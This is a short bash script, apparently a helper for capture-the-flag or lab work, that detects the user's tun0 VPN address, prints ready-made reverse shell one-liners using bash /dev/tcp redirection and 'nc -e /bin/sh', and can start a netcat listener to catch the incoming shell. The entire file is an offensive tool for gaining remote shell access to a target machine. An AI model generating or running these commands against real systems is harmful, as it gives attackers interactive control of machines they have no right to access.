#Lazy Shell Script
#!/bin/bash
host=$(/sbin/ifconfig tun0 | grep "10.10." | awk '{print $2}')
printf "0xAtti lazy shell\n"
printf "=================\n"
printf "\nPick an option\n"
echo "(1) Bash Reverse Shell with NetCat"
echo "(2) Standard Shell text output\n"
read input

if [ $input = 1 ]; then
echo What port would you like to use?
read port
printf "==================================================================\n\n"
echo   "Bash Shell:   bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n"
nc -lvp $port
fi

if [ $input = 2 ]; then
echo What port would you like to use?
read port
printf "==================================================================\n\n"
echo   "Bash Shell:   bash -c 'bash -i >& /dev/tcp/$host/$port 0>&1'\n"
echo   "\nNetCat Shell: nc -e /bin/sh $host $port\n"
printf "\n==================================================================\n"
fi
